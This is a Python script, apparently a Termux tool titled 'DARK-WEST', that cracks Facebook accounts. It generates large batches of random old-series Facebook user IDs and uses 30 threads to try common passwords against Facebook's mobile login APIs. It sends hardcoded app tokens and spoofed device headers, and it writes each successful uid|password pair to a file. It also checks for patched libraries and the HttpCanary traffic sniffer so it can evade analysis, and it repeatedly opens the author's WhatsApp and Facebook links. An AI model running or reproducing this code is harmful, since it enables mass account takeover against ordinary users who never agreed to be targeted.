#Telegram syedmuhammadakash




global loop
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

try:
    os.system('clear')
    print("╔══════════════════════════════════════════════════╗")
    print("║            DARK-WEST              ║")
    print("╚══════════════════════════════════════════════════╝")
    print('\033[38;5;46m🔷 Dani SERVER LOADING....\033[0m')
    os.system('espeak -a 300 \" Dani SERVER LOADING\"')
    os.system('xdg-open  https://chat.whatsapp.com/HHHZPtQlHXMF9BEu6BqAQH?mode=ems_copy_t')
    os.system('xdg-open  https://www.facebook.com/titer665555111')
    #os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
   # os.system('pip install httpx')
  #  os.system('pip install beautifulsoup4')
    print('\n📦 Loading Modules ...\n')
    modules = ['requests', 'urllib3', 'mechanize', 'rich']
    for module in modules:
        try:
            __import__(module)
            print(f'   ✅ {module} already installed')
        except ImportError:
            print(f'   🔄 Installing {module}...')
            os.system(f'pip install {module}')
except ImportError:
    pass

try:
    from requests.exceptions import ConnectionError
    from requests import api, models, sessions
    
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass

class sec:
    def __init__(self):
        paths = ['/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', 
                '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', 
                '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py']
        
        print("\n🔒 Running Security Checks...")
        
        for path in paths:
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f:
                        content = f.read()
                        if 'print' in content:
                            self.security_alert()
                except:
                    continue
        
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png') or os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.security_alert()
        
        print("✅ Security checks passed!")
        return None

    def security_alert(self):
        print('\n' + '='*50)
        print(' \033[1;32m⚠️  SECURITY ALERT DETECTED!')
        print(' \033[1;31mACCESS DENIED')
        print('='*50)
        self.linex()
        exit()

    def linex(self):
        print(f'    {W}--------------------------------------------')

method = []
oks = []
cps = []
loop = 0
user = []
X = '[1;37m'
rad = '[38;5;196m'
G = '[38;5;46m'
Y = '[38;5;220m'
PP = '[38;5;203m'
RR = '[38;5;196m'
GS = '[38;5;40m'
W = '[1;37m'

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f'Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'
    return random.choice([A, B, C, D])

def wind():
    aV = str(random.choice(range(10, 20)))
    A = f'Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    latest_build = random.randint(6000, 7000)
    latest_patch = random.randint(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def wind2():
    aV = str(random.choice(range(10, 20)))
    A = f'Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    latest_build = random.randint(6000, 7200)
    latest_patch = random.randint(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def ____banner____():
    # If/Else block for clearing the screen
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
        
    # --- START OF COLORED ASCII LOGO ---
    # Logo: Using Bright Green, Yellow, and Red for a vibrant look
    print('[1;32m██████╗░░█████╗░[1;33m███╗░░██╗[1;32m██╗')
    print('[1;32m██╔══██╗██╔══██╗[1;33m████╗░██║[1;32m██║')
    print('[1;33m██║░░██║███████║[1;31m██╔██╗██║[1;33m██║')
    print('[1;31m██║░░██║██╔══██║██║╚████║██║')
    print('[1;31m██████╔╝██║░░██║██║░╚███║██║')
    print('[1;34m╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝')
    # --- END OF COLORED ASCII LOGO ---
    
    print('                                                     ')

    # --- START OF NEW INFO & DESIGN (Cyan and Bright Green) ---
    # G, W, etc. are global color variables
    print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('[1;36m[+] [1;37m Name        : [1;32mDanish')
    print('[1;36m[+] [1;37m GitHub      : [1;32mDanicoder-12')
    print('[1;36m[+] [1;37m WhatsApp    : [1;32m03124930108')
    print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    # --- END OF NEW INFO & DESIGN ---
    os.system('xdg-open  https://chat.whatsapp.com/HHHZPtQlHXMF9BEu6BqAQH?mode=ems_copy_t')
def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ['1000000000']:
            Dani = '2009'
            return Dani
        if uid[:9] in ['100000000']:
            Dani = '2009'
            return Dani
        if uid[:8] in ['10000000']:
            Dani = '2009'
            return Dani
        if uid[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            Dani = '2009'
            return Dani
        if uid[:7] in ['1000006', '1000007', '1000008', '1000009']:
            Dani = '2010'
            return Dani
        if uid[:6] in ['100001']:
            Dani = '2010'
            return Dani
        if uid[:6] in ['100002', '100003']:
            Dani = '2011'
            return Dani
        if uid[:6] in ['100004']:
            Dani = '2012'
            return Dani
        if uid[:6] in ['100005', '100006']:
            Dani = '2013'
            return Dani
        if uid[:6] in ['100007', '100008']:
            Dani = '2014'
            return Dani
        if uid[:6] in ['100009']:
            Dani = '2015'
            return Dani
        if uid[:5] in ['10001']:
            Dani = '2016'
            return Dani
        if uid[:5] in ['10002']:
            Dani = '2017'
            return Dani
        if uid[:5] in ['10003']:
            Dani = '2018'
            return Dani
        if uid[:5] in ['10004']:
            Dani = '2019'
            return Dani
        if uid[:5] in ['10005']:
            Dani = '2020'
            return Dani
        if uid[:5] in ['10006']:
            Dani = '2021'
            return Dani
        if uid[:5] in ['10009']:
            Dani = '2023'
            return Dani
        if uid[:5] in ['10007', '10008']:
            Dani = '2022'
            return Dani
        Dani = ''
        return Dani
    if len(uid) in [9, 10]:
        Dani = '2008'
        return Dani
    if len(uid) == 8:
        Dani = '2007'
        return Dani
    if len(uid) == 7:
        Dani = '2006'
        return Dani
    if len(uid) == 14:
        if uid[:2] in ['61']:
            Dani = '2024'
        return Dani
    Dani = ''
    return Dani

def clear():
    os.system('clear')

def linex():
    print('[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    os.system("xdg-open https://www.facebook.com/titer665555111")
    os.system('xdg-open  https://www.facebook.com/titer665555111')

def BNG_71_():
    ____banner____()
    print('       [38;5;196m([1;37mA[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mOLD CLONE')
    linex()
    __Jihad__ = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mCHOICE  {W}: {Y}')
    if __Jihad__ in ['A', 'a', '01', '1']:
        old_clone()
    else:
        print(f'\n    {rad}CHOOSE VALID OPTION... ')
        time.sleep(2)
        BNG_71_()

def old_clone():
    ____banner____()
    print('       [38;5;196m([1;37mA[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mAll series')
    linex()
    print('       [38;5;196m([1;37mB[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46m100003/4 series')
    linex()
    print('       [38;5;196m([1;37mC[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46m2009 series')
    linex()
    _input = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mCHOICE  {W}: {Y}')
    if _input in ['A', 'a', '01', '1']:
        old_One()
    elif _input in ['B', 'b', '02', '2']:
        old_Tow()
    elif _input in ['C', 'c', '03', '3']:
        old_Tree()
    else:
        print(f'\n[×]{rad} Choose Value Option... ')
        BNG_71_()

def old_One():
    user = []
    ____banner____()
    print('       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mOLD CODE[38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46m 2010-2014')
    ask = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mSELECT {Y}:{G} ')
    linex()
    ____banner____()
    print('       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mEXAMPLE[38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46m20000 / 30000 / 99999')
    limit = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mSELECT {Y}:{G} ')
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('       [38;5;196m([1;37mA[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mMETHOD 1')
    print('       [38;5;196m([1;37mB[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mMethod 2')
    linex()
    meth = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mCHOICE {W}(A/B): {Y}').strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f'       [38;5;196m([1;37m[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}')
        print(f'       [38;5;196m([1;37m[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}')
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f'    {rad}[!] INVALID METHOD SELECTED')
                return

def old_Tow():
    user = []
    ____banner____()
    print(f'        [666([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mOld code {Y}:{G} 2010-2014')
    ask = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mSelect {Y}:{G} ')
    linex()
    ____banner____()
    print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mExample {Y}:{G} 20000 / 30000 / 99999')
    limit = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46m Select {Y}:{G} ')
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       [38;5;196m([1;37mA[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mMethod A')
    print('       [38;5;196m([1;37mB[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mMethod B')
    linex()
    meth = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mCHOICE {W}(A/B): {Y}').strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}')
        print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}')
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f'    {rad}[!] INVALID METHOD SELECTED')
                return

def old_Tree():
    user = []
    ____banner____()
    print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mOLD CODE {Y}:{G} 2009-2010')
    ask = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mSELECT {Y}:{G} ')
    linex()
    ____banner____()
    print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999')
    limit = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mTOTAL ID COUNT {Y}:{G} ')
    linex()
    prefix = '1000002'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       [38;5;196m([1;37mA[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46m Method A')
    print('       [38;5;196m([1;37mB[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46m Method B')
    linex()
    meth = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mCHOICE {W}(A/B): {Y}').strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f'       [38;5;196m([1;37m[38;5;196m)[1;37m[38;5;196m[1;37m[1;37mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}')
        print(f'       [38;5;196m([1;37m[38;5;196m)[1;37m[38;5;196m[1;37m[1;37mUSE AIRPLANE MOD FOR GOOD RESULT{G}')
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f'    {rad}[!] INVALID METHOD SELECTED')
                return

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f'\r\r[1;37m>[38;5;196m×[1;37m<[38;5;196m([1;37mDani-M1[38;5;196m)[1;37m[38;5;196m×[1;37m[38;5;196m([38;5;192m{loop}[38;5;196m)[1;37m[38;5;196m×[1;37m[38;5;196m([1;37mOK[38;5;196m)[1;37m[38;5;196m×[1;37m[38;5;196m([38;5;192m{len(oks)}[38;5;196m)')
        sys.stdout.flush()
        for pw in ['123456789', '123456', '1234567', '12345678', '1234567890']:
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': str(uid), 'password': str(pw), 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US'}
            data.update({'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'})
            headers = {'User-Agent': wind(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f'\r\r[1;37m[38;5;196m[1;37m[38;5;196m([1;37mDani[38;5;196m) [1;97m• [38;5;46m{uid} [1;97m• [38;5;46m{pw} [1;97m• [1;37m{creationyear(uid)}')
                open('/sdcard/Dani-OLD-M1-OK.txt', 'a').write(uid + '|' + pw + '\n')
                oks.append(uid)
                return
            if 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f'\r\r[1;37m[38;5;196m[1;37m[38;5;196m([1;37mDani[38;5;196m) [1;97m• [38;5;46m{uid} [1;97m• [38;5;46m{pw} [1;97m• [38;5;45m{creationyear(uid)}')
                open('/sdcard/Dani-OLD-M1-OK.txt', 'a').write(uid + '|' + pw + '\n')
                oks.append(uid)
                return
    except Exception:
        pass
    loop += 1
    time.sleep(5)

def login_2(uid):
    global loop
    sys.stdout.write(f'\r\r[1;37m>[38;5;196m×[1;37m<[38;5;196m([1;37mDani-M2[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;196m([38;5;192m{loop}[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;196m([1;37mOK[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;196m([38;5;192m{len(oks)}[38;5;196m)')
    try:
        for pw in ['123456789', '123456', '1234567', '12345678', '1234567890']:
            with requests.Session() as session:
                headers = {'x-fb-connection-bandwidth': str(rr(20000000, 29999999)), 'x-fb-sim-hni': str(rr(20000, 40000)), 'x-fb-net-hni': str(rr(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': wind(), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                po = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers).json()
                if 'session_key' in str(po):
                    print(f'\r\r[38;5;196m([1;37mDani[38;5;196m) [1;97m• [38;5;46m{uid} [1;97m• [38;5;46m{pw} [1;97m• [38;5;45m{creationyear(uid)}')
                    open('/sdcard/Dani-OLD-M2-OK.txt', 'a').write(uid + '|' + pw + '\n')
                    oks.append(uid)
                    return
                if 'session_key' in po:
                    print(f'\r\r[38;5;196m([1;37mDani[38;5;196m) [1;97m= [38;5;46m{uid} [1;97m= [38;5;46m{pw} [1;97m= [38;5;45m{creationyear(uid)}')
                    open('/sdcard/Dani-OLD-M2-OK.txt', 'a').write(uid + '|' + pw + '\n')
                    oks.append(uid)
                    return
    except Exception as e:
        pass
    loop += 1

if __name__ == '__main__':
    BNG_71_()
